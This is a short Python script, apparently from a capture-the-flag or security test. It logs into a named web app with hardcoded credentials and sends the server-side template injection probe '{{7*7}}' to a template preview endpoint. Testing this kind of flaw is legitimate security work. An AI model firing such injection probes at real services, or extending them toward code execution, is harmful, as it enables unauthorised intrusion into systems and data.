import requests, time, base64, json

base = 'https://outofcontext-app.onrender.com'

def login():
    for a in range(8):
        s = requests.Session()
        s.post(base + '/login', data={'username': 'compliance_officer', 'password': 'AuditPolicy2026!'}, timeout=40)
        if s.cookies.get('session'):
            return s
        time.sleep(25)
    return None

s = login()

def preview(content, context=None):
    b64 = base64.b64encode(content.encode()).decode()
    body = {'content_b64': b64, 'context': context or {}}
    for a in range(6):
        try:
            r = s.post(base + '/api/templates/preview', json=body, timeout=40, allow_redirects=False)
        except Exception:
            time.sleep(12); continue
        if r.status_code in (429, 502, 503):
            time.sleep(18); continue
        return r.status_code, r.headers.get('content-type', ''), r.text[:600]
    return 'TRANSIENT', '', ''

print('=== {{7*7}} ===')
print(preview('Hello {{7*7}} World'))
